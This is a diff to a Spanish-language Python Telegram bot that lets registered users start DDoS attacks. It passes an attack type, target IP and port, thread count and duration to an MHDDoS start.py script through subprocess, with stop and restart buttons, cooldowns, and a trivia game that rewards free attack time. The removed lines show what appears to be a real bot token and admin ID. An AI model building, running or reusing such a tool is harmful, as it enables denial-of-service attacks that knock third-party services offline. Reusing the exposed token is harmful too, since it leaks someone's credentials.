@@ -9,10 +9,9 @@ import subprocess
 from threading import Lock, Thread, Timer
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# Configuración del bot
-BOT_TOKEN = "7692852873:AAENsX-cI0gwtuZLzWUzpr7BBXqzUYW9B-E"
-ADMIN_ID = 6348583777
-GROUP_LINK = "@zFerCrashGoup"  # Reemplaza con el enlace de tu grupo
+BOT_TOKEN = "TU BOT TOKEN"
+ADMIN_ID = TU ADMIN ID
+GROUP_LINK = "LINK DE TU GRUPO"
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -21,12 +20,10 @@ cooldowns = {}
 active_attacks = {}
 spam_cooldowns = {}
 
-# Rutas de archivos JSON
 groups_file = "groups.json"
 users_file = "users.json"
 free_time_file = "free_time.json"
 
-# Verificar si los archivos existen, si no, crearlos
 if not os.path.exists(groups_file):
     with open(groups_file, "w") as f:
         json.dump({"groups": []}, f)
@@ -130,7 +127,7 @@ def generate_math_question(level):
 
 def timeout_handler(message, answer, user_id, level):
     """Maneja el tiempo límite de respuesta."""
-    time.sleep(20)  # Esperar 20 segundos
+    time.sleep(20)
     bot.send_message(message.chat.id, "❌ *Tiempo agotado. ¡Inténtalo de nuevo!*", parse_mode="Markdown")
 
 @bot.message_handler(commands=["trivia"])
@@ -161,11 +158,11 @@ def check_answer(message, correct_answer, user_id, level, timer):
         bot.send_message(message.chat.id, "✅ *¡Respuesta correcta!*")
 
         if level == "easy":
-            free_duration = 1  # 1 hora
+            free_duration = 1
         elif level == "normal":
-            free_duration = 3  # 3 horas
+            free_duration = 3 
         elif level == "hard":
-            free_duration = 24  # 1 día
+            free_duration = 24
 
         free_time = load_free_time()
         free_time[user_id] = time.time() + free_duration * 3600
@@ -242,7 +239,7 @@ def handle_mute(message):
     try:
         args = message.text.split()
         user_id = int(args[1])
-        mute_time = int(args[2])  # Tiempo en minutos
+        mute_time = int(args[2])
         bot.restrict_chat_member(message.chat.id, user_id, until_date=time.time() + mute_time * 60)
         bot.reply_to(message, f"✅ *Usuario {user_id} silenciado por {mute_time} minutos.*", parse_mode="Markdown")
     except Exception as e:
@@ -259,12 +256,11 @@ def handle_math(message):
 
 @bot.message_handler(commands=["ping"])
 def handle_ping(message):
-    if not is_allowed(message):  # Verifica si el usuario está registrado
+    if not is_allowed(message):
         return
 
     telegram_id = message.from_user.id
 
-    # Verificar cooldown
     if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
         bot.reply_to(message, "❌ *Espera 20 segundos* antes de intentar de nuevo.")
         return
@@ -286,10 +282,9 @@ def handle_ping(message):
 
     attack_type = args[1]
     ip_port = args[2]
-    threads = int(args[3])  # Convertir a entero
-    duration = int(args[4])  # Convertir a entero
+    threads = int(args[3])
+    duration = int(args[4])
 
-    # Validar límites
     if threads > 3:
         bot.reply_to(message, "❌ *El número máximo de hilos permitido es 3.*")
         return
@@ -304,7 +299,7 @@ def handle_ping(message):
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         active_attacks[telegram_id] = process
         cooldowns[telegram_id] = time.time()
-        cooldowns[f"last_command_{telegram_id}"] = message.text  # Guardar el último comando
+        cooldowns[f"last_command_{telegram_id}"] = message.text
 
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))
@@ -346,7 +341,6 @@ def handle_stop_attack(call):
         try:
             bot.answer_callback_query(call.id, "✅ *Ataque detenido con éxito.*")
             
-            # Crear botón para realizar el ataque nuevamente
             markup = InlineKeyboardMarkup()
             markup.add(InlineKeyboardButton("🔄 Realizar ataque nuevamente", callback_data=f"restart_attack_{telegram_id}"))
 
@@ -359,7 +353,6 @@ def handle_stop_attack(call):
                 parse_mode="Markdown",
             )
 
-            # Programar la eliminación del mensaje después de 20 segundos
             Timer(20, delete_message, args=(call.message.chat.id, call.message.message_id)).start()
         except Exception as e:
             print(f"Error al responder a la consulta de callback o editar el mensaje: {str(e)}")
@@ -378,9 +371,9 @@ def delete_message(chat_id, message_id):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("restart_attack_"))
 def handle_restart_attack(call):
-    telegram_id = int(call.data.split("_")[2])  # Extraer el ID del usuario que inició el ataque
+    telegram_id = int(call.data.split("_")[2])
 
-    if call.from_user.id != telegram_id:  # Verificar si el usuario que presionó el botón es el mismo que inició el ataque
+    if call.from_user.id != telegram_id:
         try:
             bot.answer_callback_query(
                 call.id, "❌ *Solo el usuario que inició el ataque puede repetirlo.*"
@@ -389,21 +382,18 @@ def handle_restart_attack(call):
             print(f"Error al responder a la consulta de callback: {str(e)}")
         return
 
-    # Verificar si el usuario está silenciado por spam
     if telegram_id in spam_cooldowns and time.time() - spam_cooldowns[telegram_id] < 60:
         bot.answer_callback_query(
             call.id, "❌ *Has hecho demasiadas solicitudes. Espera 1 minuto antes de intentar de nuevo.*"
         )
         return
 
-    # Verificar si el ataque aún está activo
     if telegram_id not in active_attacks:
         bot.answer_callback_query(
             call.id, "❌ *El tiempo para reiniciar el ataque ha expirado.*"
         )
         return
 
-    # Obtener el último comando de ataque del usuario
     last_command = cooldowns.get(f"last_command_{telegram_id}")
     if not last_command:
         try:
@@ -412,15 +402,13 @@ def handle_restart_attack(call):
             print(f"Error al responder a la consulta de callback: {str(e)}")
         return
 
-    # Ejecutar el último comando de ataque
     try:
         args = last_command.split()
         attack_type = args[1]
         ip_port = args[2]
-        threads = int(args[3])  # Convertir a entero
-        duration = int(args[4])  # Convertir a entero
+        threads = int(args[3])
+        duration = int(args[4])
 
-        # Validar límites
         if threads > 1:
             bot.answer_callback_query(call.id, "❌ *El número máximo de hilos permitido es 1.*")
             return
@@ -433,7 +421,7 @@ def handle_restart_attack(call):
 
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         active_attacks[telegram_id] = process
-        cooldowns[telegram_id] = time.time()  # Actualizar el cooldown
+        cooldowns[telegram_id] = time.time()
 
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))
@@ -454,7 +442,6 @@ def handle_restart_attack(call):
     except Exception as e:
         bot.answer_callback_query(call.id, f"❌ *Error al reiniciar el ataque:* {str(e)}")
 
-    # Silenciar al usuario si hace spam
     if telegram_id in spam_cooldowns:
         spam_cooldowns[telegram_id] = time.time()
     else:
@@ -566,7 +553,7 @@ def handle_timeactive(message):
         return
 
     elapsed_time = time.time() - start_time
-    remaining_time = max(0, 140 * 60 - elapsed_time)  # 140 minutos en segundos
+    remaining_time = max(0, 140 * 60 - elapsed_time)
 
     elapsed_minutes = int(elapsed_time // 60)
     elapsed_seconds = int(elapsed_time % 60)
@@ -650,12 +637,12 @@ def notify_groups_bot_started():
 
 def check_shutdown_time():
     """Verifica el tiempo restante y notifica a los grupos cuando falten 5 minutos."""
-    start_time = time.time()  # Tiempo de inicio del bot
+    start_time = time.time()
     while True:
         elapsed_time = time.time() - start_time
-        remaining_time = max(0, 140 * 60 - elapsed_time)  # 140 minutos en segundos
+        remaining_time = max(0, 140 * 60 - elapsed_time)
 
-        if remaining_time <= 300:  # 5 minutos en segundos
+        if remaining_time <= 300:
             groups = load_groups()
             for group_id in groups:
                 try:
@@ -670,20 +657,16 @@ def check_shutdown_time():
                 except Exception as e:
                     print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")
 
-            # Esperar a que el bot se apague
-            time.sleep(300)  # Esperar 5 minutos
+            time.sleep(300)
             break
 
-        time.sleep(60)  # Verificar cada minuto
+        time.sleep(60)
 
 if __name__ == "__main__":
-    # Notificar a los grupos que el bot ha sido encendido
     notify_groups_bot_started()
 
-    # Iniciar el hilo para verificar el tiempo de apagado
     shutdown_thread = threading.Thread(target=check_shutdown_time)
     shutdown_thread.daemon = True
     shutdown_thread.start()
 
-    # Iniciar el bot
     bot.infinity_polling()
